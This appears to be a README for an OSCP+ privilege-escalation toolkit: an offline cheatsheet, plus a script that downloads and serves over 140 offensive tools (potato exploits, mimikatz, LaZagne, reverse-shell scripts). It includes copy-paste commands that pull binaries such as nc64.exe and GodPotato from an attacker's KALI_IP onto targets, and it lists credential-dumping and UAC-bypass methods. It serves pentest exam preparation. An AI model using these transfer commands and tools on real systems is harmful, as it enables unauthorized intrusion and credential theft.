# MahiestaPrivEsc — OSCP+ Local Privilege Escalation Toolkit

> The most complete, battle-tested local privilege escalation reference and toolkit for OSCP+. Built to guarantee the 3 standalone boxes.

---

## What's Inside

| File | Purpose |
|------|---------|
| `privesc.html` | Self-contained interactive cheatsheet — all Windows + Linux privesc vectors with live variable substitution |
| `ToolKitDownloader.py` | One-command toolkit downloader — downloads 140+ tools, serves them via HTTP |
| `install_toolkit.sh` | Quick installer script |

---

## privesc.html — Interactive Cheatsheet

A **single self-contained HTML file** you open in any browser. No internet required during exam.

### Features

- **Live variable substitution** — type your `KALI_IP`, `TARGET`, `RPORT`, `WPATH` once at the top and every command in the guide updates instantly
- **Pipeline steps** — every attack has DETECT → CONFIRM → EXPLOIT → VERIFY → RESTORE stages
- **One-click copy** — every command block has a copy button
- **Dark/light mode toggle**
- **Notes per section** — persistent notes saved in `localStorage`
- **Progress tracking** — mark sections as tried / working / done
- **Auto-transfer block** — detects tools referenced in commands and generates the exact `iwr` / `wget` download command
- **GTFOBins lookup** — built-in JSON lookup for SUID/sudo/capabilities exploitation

### Windows Coverage (30+ sections)

| Section | Vectors |
|---------|---------|
| Enumeration | winPEAS, Seatbelt, PowerUp, SharpUp, PrivescCheck — with CLM bypass alternatives |
| Service Binary Abuse | PowerUp automation, manual accesschk, SharpUp (CLM-safe) |
| Unquoted Service Path | Detection, writable path injection, restart/reboot |
| DLL Hijacking | Process Monitor approach, hijackable DLL list |
| Scheduled Tasks | writable task binaries, XML injection, Git hook abuse |
| Registry DACL | Weak service registry permissions |
| AlwaysInstallElevated | MSI payload generation |
| Token Privileges | SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeLoadDriver, SeManageVolume, SeDebug, SeDebugPrivilege |
| Potato Family | GodPotato (universal), PrintSpoofer (with Spooler check), SweetPotato, SigmaPotato, JuicyPotato, RoguePotato, SharpEfsPotato |
| Credential Hunting | Cleartext creds, SAM/NTDS, LSASS dump, Credential Manager, AutoLogon |
| UAC Bypass | fodhelper, eventvwr, sdclt, computerdefaults |
| LSASS Dump | procdump, task manager, mimikatz |
| Deep Recon | Hidden files, ADS streams, registry creds, PowerShell history, Snaffler, LaZagne, SessionGopher, SharpDPAPI |

### Linux Coverage (20+ sections)

| Section | Vectors |
|---------|---------|
| Enumeration | LinPEAS, lse.sh, LinEnum, manual commands |
| SUID/SGID | GTFOBins-linked, full binary table |
| Capabilities | cap_setuid, cap_net_raw, cap_dac_override, Python fix |
| Sudo | NOPASSWD, env_keep LD_PRELOAD, wildcard, sudoedit |
| Cron Jobs | pspy64 (`-pf -i 1000`, 2+ min rule), writable scripts, ClamAV VirusEvent hook |
| Kernel Exploits | DirtyCow (with CRITICAL restore step), DirtyPipe, PwnKit, Baron Samedit |
| Writable /etc/passwd | openssl passwd hash injection |
| NFS no_root_squash | Correct mount flags (`-t nfs -o rw,vers=3`) |
| LD_PRELOAD | env_keep requirement explained, LD_LIBRARY_PATH alternative |
| PATH Hijacking | SUID binary PATH injection |
| MySQL as Root | sys_exec SUID bash, INTO OUTFILE cron/webshell, SSH key injection |
| Docker/LXD | Container escape techniques |
| Deep Recon | Hidden files, shell history, /proc/environ leaks, SSH key hunt, LaZagne, Mimipenguin, lse.sh |

---

## ToolKitDownloader.py

Downloads **140+ tools** organized by category and serves them via HTTP so you can pull them onto any target.

### Usage

```bash
# Download everything + start HTTP server
python3 ToolKitDownloader.py

# Download only (no server)
python3 ToolKitDownloader.py --download-only

# Serve existing cache (fast restart)
python3 ToolKitDownloader.py --serve-only

# Only download one category
python3 ToolKitDownloader.py --category windows

# List all tools and cache status
python3 ToolKitDownloader.py --list
```

### Tool Categories

**Windows Binaries**
- Enumeration: winPEAS (x64/bat/any), SharpUp, Seatbelt, Snaffler, Group3r, accesschk (v5.x)
- Potatoes: GodPotato (NET2/NET4), PrintSpoofer64, SweetPotato, JuicyPotato, JuicyPotatoNG, RoguePotato, SharpEfsPotato, LocalPotato, SigmaPotato, NetworkServiceExploit, churrasco
- Tokens: FullPowers, SeManageVolumeExploit, RunasCs
- Credentials: mimikatz, LaZagne, SharpDPAPI, SharpDump, SharpChrome, SafetyKatz, procdump
- AD: Rubeus, Certify, SharpHound, Whisker, SharpGPOAbuse, KrbRelayUp, PingCastle
- Tunneling: chisel, ligolo-ng

**PowerShell Scripts**
- Privesc: PowerUp, PrivescCheck, Sherlock, jaws-enum, PowerSharpPack, WinPwn
- AD/Recon: PowerView (original + BC-Security), SharpHound.ps1, ADRecon
- Credentials: Invoke-Mimikatz, SessionGopher, Get-GPPPassword, LAPSToolkit
- Kerberos: Invoke-Kerberoast, ASREPRoast
- Shells: powercat, Invoke-ConPtyShell, Invoke-PowerShellTcp

**Linux Binaries & Scripts**
- Enumeration: linPEAS (sh/small/fat), LinEnum, lse.sh, linuxprivchecker
- Exploit Suggesters: linux-exploit-suggester (.sh + .pl)
- Process Monitor: pspy64, pspy32, pspy64s, pspy32s
- Privesc: traitor, LaZagne.py (from LaZagne_src repo), mimipenguin.py/.sh
- Static Binaries: socat, ncat, nmap, busybox, curl
- Tunneling: chisel (amd64 + 386), ligolo-ng agent + proxy

**Git Repositories (auto-cloned)**
- impacket, Responder, NetExec, Certipy, BloodHound.py
- PayloadsAllTheThings, SUDO_KILLER, LaZagne, BeRoot, mimipenguin
- linux-exploit-suggester, GTFOBLookup, LinEsc
- EoPLoadDriver, ExploitCapcom (SeLoadDriverPrivilege source)
- SeRestoreAbuse (source)
- noPac, CVE-2021-1675, CVE-2020-1472, and more

### On-target download commands

After running the server, it prints these commands — just copy-paste onto the target:

```powershell
# Windows PowerShell
iwr -uri http://KALI_IP:PORT/windows/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://KALI_IP:PORT/windows/GodPotato-NET4.exe -Outfile gp.exe
iwr -uri http://KALI_IP:PORT/scripts/PowerUp.ps1 -Outfile PowerUp.ps1

# Windows CMD (certutil)
certutil -urlcache -split -f http://KALI_IP:PORT/windows/nc64.exe nc64.exe

# Linux
wget http://KALI_IP:PORT/linux/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh
wget http://KALI_IP:PORT/linux/pspy64 -O pspy64 && chmod +x pspy64
```

---

## Quick Start for OSCP Exam

```bash
# 1. Start toolkit (download + serve)
cd ~/project1337
python3 ToolKitDownloader.py

# 2. Open the cheatsheet in your browser
firefox ~/privesc-toolkit/privesc.html
# OR serve via the running server: http://KALI_IP:PORT/privesc.html

# 3. Fill in the variables at the top of the cheatsheet:
#    KALI_IP, TARGET, RPORT, WPATH, USER — every command updates automatically

# 4. Follow the pipeline steps for each vector
```

---

## Key Design Decisions

**Why a single HTML file?**
No dependencies, works offline, opens instantly, no Node/Python server needed during exam. Everything is self-contained — CSS, JavaScript, all content in one file.

**Why `{{VARIABLE}}` substitution instead of static text?**
Every command in the guide contains placeholder variables. When you type your actual IP/path at the top, all 500+ commands update in real time. No more copy-paste errors or manual find-replace.

**Why pipeline steps?**
DETECT → CONFIRM → EXPLOIT → VERIFY → RESTORE mirrors the actual thought process during privesc. The RESTORE step prevents leaving evidence and breaking machines (critical for OSCP exam stability).

**CLM bypass strategy**
Every `.ps1` script section includes dot-source alternatives and C# `.exe` fallbacks for when PowerShell Constrained Language Mode blocks `Import-Module` and `Invoke-Expression`.

---

## Credits

Built for OSCP+ exam preparation. Incorporates techniques and tooling from:
- PEASS-ng (linPEAS/winPEAS)
- PowerSploit (PowerUp, PowerView)
- itm4n (FullPowers, PrintSpoofer, PrivescCheck)
- BeichenDream (GodPotato)
- tylerdotrar (SigmaPotato)
- Ghostpack (Rubeus, Certify, SharpUp, Seatbelt, SharpDPAPI)
- The entire OSCP/HTB/PG community

---

## Disclaimer

This toolkit is for **authorized penetration testing, CTF competitions, and educational purposes only**. Only use on systems you own or have explicit written permission to test.
